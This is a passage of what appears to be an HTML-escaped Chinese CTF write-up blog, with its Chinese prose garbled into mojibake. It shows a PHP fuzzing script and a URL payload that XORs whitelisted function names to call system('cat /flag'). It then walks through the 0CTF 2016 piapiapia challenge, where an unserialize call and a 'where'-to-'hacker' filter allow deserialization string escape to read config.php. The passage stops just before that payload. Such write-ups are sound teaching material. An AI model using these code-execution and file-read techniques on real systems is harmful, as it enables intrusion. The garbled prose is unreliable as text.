&lt;p&gt;Fuzzçš„ä»£ç &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$whitelist &lt;span style="color:#f92672"&gt;=&lt;/span&gt; [&lt;span style="color:#e6db74"&gt;&amp;#39;abs&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;acos&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;acosh&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;asin&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;asinh&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;atan2&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;atan&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;atanh&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;base_convert&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;bindec&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;ceil&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;cos&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;cosh&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;decbin&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;dechex&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;decoct&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;deg2rad&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;exp&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;expm1&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;floor&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;fmod&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;getrandmax&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;hexdec&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;hypot&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;is_finite&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;is_infinite&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;is_nan&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;lcg_value&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;log10&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;log1p&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;log&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;max&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;min&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;mt_getrandmax&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;mt_rand&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;mt_srand&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;octdec&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;pi&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;pow&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;rad2deg&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;rand&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;round&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;sin&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;sinh&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;sqrt&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;srand&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;tan&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;tanh&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$exp&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; ($i&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;; $i &lt;span style="color:#f92672"&gt;&amp;lt;&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;count&lt;/span&gt;($whitelist); $i&lt;span style="color:#f92672"&gt;++&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; ($j&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;; $j &lt;span style="color:#f92672"&gt;&amp;lt;&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;1000&lt;/span&gt;; $j&lt;span style="color:#f92672"&gt;++&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $exp&lt;span style="color:#f92672"&gt;=&lt;/span&gt;$whitelist[$i]&lt;span style="color:#f92672"&gt;^&lt;/span&gt;$j&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; $whitelist[$i]&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;^&amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$j&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;----&amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$exp;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\n&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;éœ€è¦çŸ¥é“çš„æœ‰ï¼ŒphpæŸä¸ªç‰ˆæœ¬ä»¥åå¯ä»¥ä½¿ç”¨å‡½æ•°ååŠ &lt;code&gt;()&lt;/code&gt;çš„æ–¹å¼è°ƒç”¨å‡½æ•°ï¼Œå¦‚&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;base_convert&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;strtoupper&amp;#34;&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;36&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;10&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$cos&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;base_convert&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;2927671435926243&amp;#34;&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;10&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;36&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\n&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$cos(&lt;span style="color:#e6db74"&gt;&amp;#34;abc&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸Šé¢ä»£ç æ˜¯æŠŠå­—ç¬¦ä¸²&lt;strong&gt;strtoupper&lt;/strong&gt;èµ‹å€¼åˆ°å˜é‡&lt;code&gt;$cos&lt;/code&gt;ï¼Œç„¶åç›´æ¥ä½¿ç”¨&lt;code&gt;$cos()&lt;/code&gt;æ‰§è¡Œ&lt;code&gt;strtoupper()&lt;/code&gt;å‡½æ•°ã€‚ä»£ç ä¸­ä½¿ç”¨&lt;code&gt;base_convert&lt;/code&gt;å‡½æ•°ä¹Ÿæ˜¯è¿™é“é¢˜çš„ä¸€ç§æ€è·¯å“¦ã€‚ï¹™ËŠ_&amp;gt;Ë‹ï¹š&lt;/p&gt;
&lt;p&gt;è¿˜éœ€è¦çŸ¥é“çš„æ˜¯å¼‚æˆ–çš„æ—¶å€™ä¼šæç¤ºï¼šå­—ç¬¦ä¸²å’Œæ•°å­—ä¸èƒ½ç›´æ¥å¼‚æˆ–ï¼Œä½¿ç”¨æ‹¬å·&lt;code&gt;()&lt;/code&gt;æ‹¬èµ·æ¥å°±å¯ä»¥äº†ã€‚&lt;code&gt;$&lt;/code&gt;å¦‚æœç›´æ¥æ‹¼æ¥åˆ°å­—ç¬¦ä¸²ä¸Šä¹Ÿæ˜¯ä¸å¯ä»¥çš„ï¼Œéœ€è¦ä½¿ç”¨å½¢å¦‚&lt;code&gt;$$cos&lt;/code&gt;æ‰å¯ä»¥æ­£ç¡®çš„æŒ‡å‘å˜é‡ã€‚&lt;/p&gt;
&lt;p&gt;æœ€ç»ˆpayloadï¼š&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;c&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;$cos&lt;span style="color:#f92672"&gt;=&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;is_finite&lt;/span&gt;&lt;span style="color:#f92672"&gt;^&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;6&lt;/span&gt;)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;4&lt;/span&gt;))&lt;span style="color:#f92672"&gt;.&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;rad2deg&lt;/span&gt;&lt;span style="color:#f92672"&gt;^&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;7&lt;/span&gt;)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;5&lt;/span&gt;));$cos&lt;span style="color:#f92672"&gt;=&lt;/span&gt;$$cos;$cos{&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;}($cos{&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;})&lt;span style="color:#f92672"&gt;&amp;amp;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;system&lt;/span&gt;&lt;span style="color:#f92672"&gt;&amp;amp;&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;cat&lt;/span&gt; &lt;span style="color:#f92672"&gt;/&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;flag&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
&lt;h1 id="0ctf-2016piapiapia"&gt;[0CTF 2016]piapiapia
&lt;/h1&gt;&lt;p&gt;ä½¿ç”¨ç›®å½•æ‰«æå‘ç°äº†www.zipç½‘ç«™å¤‡ä»½ã€‚&lt;/p&gt;
&lt;p&gt;ç½‘ç«™ç»“æ„&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;static&lt;/p&gt;
&lt;p&gt;upload&lt;/p&gt;
&lt;p&gt;class.php&lt;/p&gt;
&lt;p&gt;config.php&lt;/p&gt;
&lt;p&gt;index.php&lt;/p&gt;
&lt;p&gt;profile.php&lt;/p&gt;
&lt;p&gt;register.php&lt;/p&gt;
&lt;p&gt;update.php&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;å‘ç°æœ‰registerå°±å»æ³¨å†Œä¸ªè¯•è¯•å‘—&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210309102253.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;æ³¨å†ŒæˆåŠŸå°±è·³è½¬åˆ°update.phpç•Œé¢äº†ï¼Œæ˜¯ä¸ªä¿®æ”¹ä¿¡æ¯çš„ï¼ŒæŸ¥çœ‹æºç ï¼Œä¿®æ”¹ä¿¡æ¯æœ‰æ‰‹æœºå·&lt;/p&gt;
&lt;p&gt;é‚®ç®±ã€æ˜µç§°ã€å›¾ç‰‡ï¼Œè¿˜ç”¨äº†ä¸€äº›æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤ï¼Œå¦‚æ‰‹æœºå¿…é¡»11ä½ã€é‚®ç®±æœ‰@å’Œç‚¹ã€æ˜µç§°é•¿åº¦ä¸å¤§äº10ã€å›¾ç‰‡åç§°ä½¿ç”¨äº†md5è¿›è¡ŒåŠ å¯†ã€‚å¡«å†™ä¿¡æ¯ä»¥åè·³è½¬åˆ°äº†profile.phpé¡µé¢ã€‚æ³¨æ„åˆ°å›¾ç‰‡æ‰€åœ¨çš„æ ‡ç­¾æ˜¯ï¼š&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-html" data-lang="html"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&amp;lt;&lt;span style="color:#f92672"&gt;img&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;src&lt;/span&gt;&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;data:image/gif;base64,.......&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æŸ¥çœ‹æºç profile.phpä¸­æ˜¯è¿™æ ·çš„&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$profile &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;unserialize&lt;/span&gt;($profile);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $phone &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $profile[&lt;span style="color:#e6db74"&gt;&amp;#39;phone&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $email &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $profile[&lt;span style="color:#e6db74"&gt;&amp;#39;email&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $nickname &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $profile[&lt;span style="color:#e6db74"&gt;&amp;#39;nickname&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $photo &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;base64_encode&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;file_get_contents&lt;/span&gt;($profile[&lt;span style="color:#e6db74"&gt;&amp;#39;photo&amp;#39;&lt;/span&gt;]));
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¯»å–æ–‡ä»¶ä»¥åä½¿ç”¨base64åŠ å¯†çš„è¯ä¸Šä¼ çš„åœ°æ–¹è‚¯å®šæ˜¯ä¸èƒ½ç”¨å›¾ç‰‡é©¬ä»€ä¹ˆçš„äº†ã€‚è¿˜æ³¨æ„åˆ°ä½¿ç”¨äº†&lt;code&gt;unserialize&lt;/code&gt;ï¼Œåºåˆ—åŒ–ä¹Ÿæ˜¯æ€è·¯ã€‚æƒ³è¯•è¯•ç›´æ¥è¯»flagæ‰€åœ¨æ–‡ä»¶ï¼Œåœ¨config.phpä¸­æ‰¾åˆ°äº†flagæ‰€åœ¨åœ°&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;&amp;lt;?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;php&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $config[&lt;span style="color:#e6db74"&gt;&amp;#39;hostname&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;127.0.0.1&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $config[&lt;span style="color:#e6db74"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;root&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $config[&lt;span style="color:#e6db74"&gt;&amp;#39;password&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $config[&lt;span style="color:#e6db74"&gt;&amp;#39;database&amp;#39;&lt;/span&gt;] &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $flag &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;?&amp;gt;&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;del&gt;ä¸‹è½½çš„æºç è‚¯å®šä¸ä¼šæŠŠflagç›´æ¥ç»™ä½ &lt;/del&gt;ï¼Œè¦ç›¸åŠæ³•è¯»è¿™ä¸ªæ–‡ä»¶ã€‚çœ‹åˆ°äº†æ•°æ®åº“é…ç½®ï¼Œæ„Ÿè§‰åºåˆ—åŒ–çš„å¯¹è±¡åº”è¯¥ä¹Ÿæ˜¯ä»æ•°æ®åº“è¯»å‡ºæ¥çš„ï¼Œè¿˜æœ‰ä¸€ä¸ªæ–‡ä»¶æ²¡æœ‰çœ‹ï¼šclass.phpï¼Œé¡ºä¾¿è·Ÿè¿›ä¸€ä¸‹userå¯¹è±¡ç›¸å…³çš„ï¼Œæ³¨æ„åˆ°äº†æ³¨å†Œå’Œç™»é™†éƒ½ä½¿ç”¨åˆ°äº†ä¸€ä¸ªå‡½æ•°ï¼š&lt;code&gt;filter&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$username &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;parent&lt;/span&gt;&lt;span style="color:#f92672"&gt;::&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;filter&lt;/span&gt;($username);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$password &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;parent&lt;/span&gt;&lt;span style="color:#f92672"&gt;::&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;filter&lt;/span&gt;($password);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è·Ÿè¿›ä¸€ä¸‹&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;filter&lt;/span&gt;($string) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $escape &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;array&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;\&amp;#39;&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;\\\\&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $escape &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;implode&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;, $escape) &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $string &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;preg_replace&lt;/span&gt;($escape, &lt;span style="color:#e6db74"&gt;&amp;#39;_&amp;#39;&lt;/span&gt;, $string);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $safe &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;array&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;select&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;insert&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;update&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;delete&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;where&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $safe &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;implode&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;|&amp;#39;&lt;/span&gt;, $safe) &lt;span style="color:#f92672"&gt;.&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;/i&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;preg_replace&lt;/span&gt;($safe, &lt;span style="color:#e6db74"&gt;&amp;#39;hacker&amp;#39;&lt;/span&gt;, $string);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿‡æ»¤&lt;code&gt;_&lt;/code&gt;ï¼Œselectã€insertã€updateã€deleteã€whereä¼šè¢«æ›¿æ¢æˆ&lt;code&gt;hacker&lt;/code&gt;ï¼Œwhereé•¿åº¦æ˜¯5ï¼Œhackeré•¿åº¦æ˜¯6ï¼Œæ•æ„Ÿä¸€ç‚¹çš„åº”è¯¥æƒ³åˆ°äº†åºåˆ—åŒ–å­—ç¬¦ä¸²å¯¹è±¡ä¹Ÿæ˜¯ç”¨å­—ç¬¦ä¸²é•¿åº¦çš„ï¼Œè¿™æ ·é•¿åº¦æ”¹å˜çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨&lt;a class="link" href="https://my.oschina.net/u/3076320/blog/4372683" target="_blank" rel="noopener"
&gt;PHPååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸&lt;/a&gt;ï¼Œåºåˆ—åŒ–çš„ç»“å°¾æ˜¯&lt;code&gt;&amp;quot;;}&lt;/code&gt;å¯ä»¥æ‰‹åŠ¨æ„é€ é—­åˆã€‚&lt;/p&gt;
&lt;p&gt;ç°åœ¨æ•´ç†ä¸‹æ€è·¯ã€‚å›¾ç‰‡å±æ€§é‚£é‡Œå¯ä»¥è¯»æ–‡ä»¶ï¼Œè¿‡æ»¤å‡½æ•°ä¼šå¯¼è‡´åºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸ï¼Œæ‰€ä»¥å°±æ„é€ photoè¯»å–config.phpã€‚é‚£ä¹ˆé€ƒé€¸çš„ç‚¹åœ¨å“ªé‡Œï¼Ÿç”µè¯åªèƒ½æ˜¯æ•°å­—ï¼Œé‚®ç®±éœ€è¦æœ‰@ç­‰å­—ç¬¦ï¼Œå›¾ç‰‡ä¼šè¢«md5åŠ å¯†ï¼Œæ˜µç§°å“ªé‡Œè™½ç„¶æœ‰é•¿åº¦é™åˆ¶ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬ä¼ å…¥æ•°ç»„çš„è¯å°±å¯ä»¥ç»•è¿‡ã€‚é‚£ä¹ˆå¼€å·¥&lt;/p&gt;
&lt;p&gt;å…ˆä¸Špayload&lt;/p&gt;
